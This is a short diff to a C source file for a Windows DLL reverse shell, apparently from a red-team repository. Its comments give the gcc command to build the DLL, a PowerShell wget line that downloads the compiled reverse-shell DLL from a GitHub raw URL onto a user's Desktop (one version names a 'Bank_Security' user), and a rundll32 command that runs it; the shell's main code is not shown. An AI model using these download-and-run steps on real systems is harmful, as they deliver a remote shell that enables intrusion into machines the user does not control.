@@ -1,7 +1,7 @@
 //to compile: --> 
 //gcc -shared -lws2_32 -o dll_rev_shell.dll dll_rev_shell.c
 //PS commands:
-//wget "https://github.com/t3l3m3try/Red_Team/blob/master/Reverse_Shell/DLL_Rev_Shell.dll?raw=true" -o C:\Users\Bank_Security\Desktop\rev.dll
+//wget "https://github.com/t3l3m3try/Red_Team/blob/master/Reverse_Shell/DLL_Rev_Shell.dll?raw=true" -o C:\Users\t3l3m3try\Desktop\rev.dll
 //rundll32 rev.dll,main
 
 //#include "pch.h"
@@ -54,4 +54,5 @@ case DLL_PROCESS_DETACH:
 }
 return TRUE;
 }
+
 
